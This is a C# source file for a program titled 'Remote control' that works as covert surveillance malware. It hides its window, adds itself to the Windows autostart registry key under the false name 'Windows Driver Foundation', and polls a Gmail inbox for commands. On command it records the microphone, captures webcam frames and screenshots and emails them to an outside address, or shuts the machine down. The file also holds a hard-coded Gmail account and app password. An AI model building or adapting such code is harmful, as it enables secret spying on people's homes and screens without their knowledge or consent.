//========================================//
//By: Alessio Ferretti
//Title: Remote control
//Last edited: 08.02.2023
//========================================//
using AForge.Video;
using AForge.Video.DirectShow;
using MailKit.Search;
using MailKit;
using Microsoft.VisualBasic.Devices;
using MimeKit;
using System;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using MailKit.Net.Imap;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Drawing.Imaging;
using Emgu.Util;

namespace remoteControl
{
    public partial class Form1 : Form
    {
        public static bool pictureTaken = false;
        public static string webcamFootageFileName;
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        BodyBuilder builder = new BodyBuilder();
        MimeMessage emailMessage = new MimeMessage();

        public Form1()
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

            //Second while-loop in case the PC doesn't have WLAN
            while (true)
            {
                try
                {
                    SetAutostart();

                    //Mail setup
                    emailMessage.From.Add(new MailboxAddress("Guido Mobil", "guidomobil200@gmail.com"));
                    emailMessage.To.Add(new MailboxAddress("Markus Herzig", "markusherzig208@gmail.com"));
                    emailMessage.Subject = "Remote Control - Commands";
                    builder.TextBody =
                        "Remote Control by Alessio Ferretti\n" +
                        "===========================================\n" +
                        "Here are all commands. Just send a mail to guidomobil200@gmail.com with\n" +
                        "one of the commands in the subject (e.g.'getMic)':\n\n" +
                        "getMic x[amount of seconds]\n" +
                        "screenshot\n" +
                        "shutdown\n" +
                        "getWebcam";

                    sendEmail();
                }catch(Exception ex) { }
                

                //Get email remote commands
                while (true)
                {
                    Thread.Sleep(20000);
                    try
                    {
                        GetAllEmails();
                    }
                    catch (Exception ex) { }
                }
            }
        }

        private void sendEmail()
        {
            //Something is broken here
            //Add body to message
            emailMessage.Body = builder.ToMessageBody();

            using (var client = new MailKit.Net.Smtp.SmtpClient())
            {
                client.Connect("smtp.gmail.com", 587, false);

                //SMTP server authentication if needed
                client.Authenticate("guidomobil200@gmail.com", "kxoffqstzbjwvanc");

                client.Send(emailMessage);
                builder.Attachments.Clear();
            }
        }

        //Record microphone
        private BodyBuilder record_mic(BodyBuilder builder,String secondsAsString)
        {
            record("open new Type waveaudio Alias recsound", "", 0, 0);
            record("record recsound", "", 0, 0);

            //Check if audio isn't too long
            int seconds = Convert.ToInt32(secondsAsString);
            if (seconds < 600)
            {
                Thread.Sleep(seconds * 1000);
            }
            else
            {
                Thread.Sleep(10000);
            }

            Directory.CreateDirectory("TEMPMICREC");
            string fileName = "micRec"+ DateTime.Now.ToString("HH-mm-ss") + ".wav";
            record("save recsound TEMPMICREC\\"+fileName, "", 0, 0);
            record("close recsound", "", 0, 0);
            Computer c = new Computer();
            c.Audio.Stop();
            builder.Attachments.Add("TEMPMICREC\\"+fileName);

            return builder;
        }


        //Take webcam footage
        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            webcamFootageFileName = "webcam" + DateTime.Now.ToString("HH-mm-ss")+ ".jpg";

            //Create image file
            Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
            Directory.CreateDirectory(@"TEMPWC");
            webcamFootageFileName = @"TEMPWC\" + webcamFootageFileName;
            bitmap.Save(webcamFootageFileName);
            pictureTaken = true;
        }

        //Get the latest email and check for command
        public void GetAllEmails()
        {
            ImapClient client = new ImapClient();
            client.Connect("imap.gmail.com", 993, true);

            // Note: since we don't have an OAuth2 token, disable
            // the XOAUTH2 authentication mechanism.
            client.AuthenticationMechanisms.Remove("XOAUTH2");

            client.Authenticate("guidomobil200@gmail.com", "kxoffqstzbjwvanc");

            // The Inbox folder is always available on all IMAP servers...
            var inbox = client.Inbox;
            inbox.Open(FolderAccess.ReadWrite);
            var results = inbox.Search(SearchOptions.All, SearchQuery.NotSeen);
            var latestUniqueId = results.UniqueIds[results.UniqueIds.Count - 1];
            var message = inbox.GetMessage(latestUniqueId).Subject;

            if (Regex.IsMatch(message.ToString(), @"getMic \d+$"))
            {
                emailMessage.Subject = $"Mic record from USER ({DateTime.Now.ToString("HH-mm-ss")})";
                builder.TextBody = $"Here are {Regex.Match(message.ToString(), @"\d+$").ToString()} seconds of the mic record from the USER:";

                //Record microphone
                builder = record_mic(builder, Regex.Match(message.ToString(), @"\d+$").ToString());

                //Send the email then
                sendEmail();

                //Set email to seen
                inbox.AddFlags(latestUniqueId, MessageFlags.Seen, silent: true);
            }
            if (message.ToString() == "getWebcam")
            {
                emailMessage.Subject = $"Webcam footage from USER ({DateTime.Now.ToString("HH-mm-ss")})";
                builder.TextBody = "Here is a webcam footage from the USER:";

                //Take picture with webcam
                FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice); 
                VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                videoSource.Start();
                while (true)
                {
                    if (pictureTaken == true)
                    {
                        videoSource.SignalToStop();
                        builder.Attachments.Add(webcamFootageFileName);
                        pictureTaken= false;
                        break;
                    }
                }

                //Send the email then
                sendEmail();

                //Set email to seen
                inbox.AddFlags(latestUniqueId, MessageFlags.Seen, silent: true);
            }
            if (message.ToString() == "screenshot")
            {
                emailMessage.Subject = $"Screenshot from USER ({DateTime.Now.ToString("HH-mm-ss")})";
                builder.TextBody = "Here is a screenshot from the USER:";

                Screenshot();

                //Send the email then
                sendEmail();

                //Set email to seen
                inbox.AddFlags(latestUniqueId, MessageFlags.Seen, silent: true);
            }
            if(message.ToString() == "shutdown")
            {
                //Shutdown PC
                Process.Start("shutdown", "/s /t 0");

                //Set email to seen
                inbox.AddFlags(latestUniqueId, MessageFlags.Seen, silent: true);
            }
        }

        public void SetAutostart()
        {
            //Doesn't work perfectly
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            try
            {
                rk.SetValue("Windows Driver Foundation",Application.ExecutablePath);
            }
            catch(Exception ex)
            {

            }
        }

        public void Screenshot()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);

            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                webcamFootageFileName = "screen " + DateTime.Now.ToString("HH-mm-ss") + ".jpg";

                //Create image file
                Directory.CreateDirectory(@"TEMPSCREEN");
                string path = @"TEMPSCREEN\" + webcamFootageFileName;
                bitmap.Save(path, ImageFormat.Jpeg);

                builder.Attachments.Add(path);
            }
        }


        private void Form1_Load(object sender, EventArgs e)
        {
        }
    }
}
